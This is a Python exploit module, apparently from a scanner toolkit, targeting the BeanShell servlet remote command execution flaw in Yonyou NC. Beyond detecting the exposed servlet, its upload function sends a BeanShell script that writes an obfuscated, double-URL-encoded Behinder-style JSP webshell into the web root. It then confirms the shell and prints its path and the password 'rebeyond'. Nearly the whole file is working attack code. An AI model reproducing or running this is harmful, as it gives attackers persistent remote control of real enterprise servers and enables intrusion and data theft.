from poc import core
import time


def BshServlet(url, attack):
    name = '用友 NC bsh.servlet.BshServlet 远程命令执行漏洞'
    core.start_echo(name)
    path = "/servlet/~ic/bsh.servlet.BshServlet"
    r = core.get(url, path)
    if r:
        if "BeanShell" in r.text:
            if attack:
                upload(url, path, name)
            else:
                core.end_echo(name, 'Payload：' + url + path)
                core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)


def upload(url, path, name):
    shell = "%22%253c%2525%2540%2570%2561%2567%2565%2520%2569%256d%2570%256f%2572%2574%253d%2522%256a%2561%2576%2561%252e%2575%2574%2569%256c%252e%252a%252c%256a%2561%2576%2561%2578%252e%2563%2572%2579%2570%2574%256f%252e%252a%252c%256a%2561%2576%2561%2578%252e%2563%2572%2579%2570%2574%256f%252e%2573%2570%2565%2563%252e%252a%2522%2525%253e%253c%2525%2521%2563%256c%2561%2573%2573%2520%2555%2520%2565%2578%2574%2565%256e%2564%2573%2520%2543%256c%2561%2573%2573%254c%256f%2561%2564%2565%2572%257b%2555%2528%2543%256c%2561%2573%2573%254c%256f%2561%2564%2565%2572%2520%2563%2529%257b%2573%2575%2570%2565%2572%2528%2563%2529%253b%257d%2570%2575%2562%256c%2569%2563%2520%2543%256c%2561%2573%2573%2520%2567%2528%2562%2579%2574%2565%2520%255b%255d%2562%2529%257b%2572%2565%2574%2575%2572%256e%2520%2573%2575%2570%2565%2572%252e%2564%2565%2566%2569%256e%2565%2543%256c%2561%2573%2573%2528%2562%252c%2530%252c%2562%252e%256c%2565%256e%2567%2574%2568%2529%253b%257d%257d%2525%253e%253c%2525%2569%2566%2520%2528%2572%2565%2571%2575%2565%2573%2574%252e%2567%2565%2574%254d%2565%2574%2568%256f%2564%2528%2529%252e%2565%2571%2575%2561%256c%2573%2528%2522%2550%254f%2553%2554%2522%2529%2529%257b%2553%2574%2572%2569%256e%2567%2520%256b%253d%2522%2565%2534%2535%2565%2533%2532%2539%2566%2565%2562%2535%2564%2539%2532%2535%2562%2522%253b%252f%252a%25e5%25c6%25a5%253a%25de%25a5%25c6%2501%2533%2532%254d%256d%2564%2535%253c%2584%254d%2531%2536%254d%250c%25d8%25a4%25de%25a5%25c6%2501%2572%2565%2562%2565%2579%256f%256e%2564%252a%252f%2573%2565%2573%2573%2569%256f%256e%252e%2570%2575%2574%2556%2561%256c%2575%2565%2528%2522%2575%2522%252c%256b%2529%253b%2543%2569%2570%2568%2565%2572%2520%2563%253d%2543%2569%2570%2568%2565%2572%252e%2567%2565%2574%2549%256e%2573%2574%2561%256e%2563%2565%2528%2522%2541%2545%2553%2522%2529%253b%2563%252e%2569%256e%2569%2574%2528%2532%252c%256e%2565%2577%2520%2553%2565%2563%2572%2565%2574%254b%2565%2579%2553%2570%2565%2563%2528%256b%252e%2567%2565%2574%2542%2579%2574%2565%2573%2528%2529%252c%2522%2541%2545%2553%2522%2529%2529%253b%256e%2565%2577%2520%2555%2528%2574%2568%2569%2573%252e%2567%2565%2574%2543%256c%2561%2573%2573%2528%2529%252e%2567%2565%2574%2543%256c%2561%2573%2573%254c%256f%2561%2564%2565%2572%2528%2529%2529%252e%2567%2528%2563%252e%2564%256f%2546%2569%256e%2561%256c%2528%256e%2565%2577%2520%2573%2575%256e%252e%256d%2569%2573%2563%252e%2542%2541%2553%2545%2536%2534%2544%2565%2563%256f%2564%2565%2572%2528%2529%252e%2564%2565%2563%256f%2564%2565%2542%2575%2566%2566%2565%2572%2528%2572%2565%2571%2575%2565%2573%2574%252e%2567%2565%2574%2552%2565%2561%2564%2565%2572%2528%2529%252e%2572%2565%2561%2564%254c%2569%256e%2565%2528%2529%2529%2529%2529%252e%256e%2565%2577%2549%256e%2573%2574%2561%256e%2563%2565%2528%2529%252e%2565%2571%2575%2561%256c%2573%2528%2570%2561%2567%2565%2543%256f%256e%2574%2565%2578%2574%2529%253b%257d%2525%253e%22%3B%0D"
    shell_name = "/test{0}.jsp".format(int(time.time()))
    data = "bsh.script=import+java.io.File%3B%0D%0Aimport+java.io.FileWriter%3B%0D%0Aimport+java.io.BufferedWriter%3B%0D%0Aimport+java.io.IOException%3B%0D%0A+%0D%0Atry%7B++++%0D%0AString+data+%3D{0}+%0A++++++++File+file+%3Dnew+File%28%22./webapps/nc_web/{1}%22%29%3B%0D%0A++++++++if%28%21file.exists%28%29%29%7B%0D%0A++++++++%09file.createNewFile%28%29%3B%0D%0A++++++++%7D%0D%0A++++++++FileWriter+fileWritter+%3D+new+FileWriter%28%22./webapps/nc_web/{2}%22%2Ctrue%29%3B%0D%0A++++++++fileWritter.write%28URLDecoder.decode%28data%2C%22utf-8%22%29%29%3B%0D%0A++++++++fileWritter.close%28%29%3B%0D%0A++++%7Dcatch%28IOException+e%29%7B%0D%0A++++++++e.printStackTrace%28%29%3B%0D%0A++%7D%0D%0A+%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A".format(
        shell, shell_name, shell_name)
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    r = core.post(url, path, header, data)
    if r:
        if r.status_code == 200 and "BeanShell" in r.text:
            get_shell(url, shell_name, name)
        else:
            print('\033[32m[#]写入失败,请检查payload\033[0m')
            core.end_echo(name)
    else:
        core.end_echo(name)


def get_shell(url, shell_name, name):
    webshell_path = url + shell_name
    r = core.get(url, shell_name)
    if r.status_code == 200:
        print('\033[32m[#]成功写入webshell\033[0m')
        print('\033[32m[#]webshell路径:{}\033[0m'.format(webshell_path))
        print('\033[32m[#]冰蝎密码：rebeyond\033[0m')
        print('\033[34m----------------------------------------------------\033[0m')
        core.result(name, webshell_path, 'rebeyond')
    else:
        print('\033[32m[#]写入失败,未找到上传后文件。\033[0m')
        core.end_echo(name)
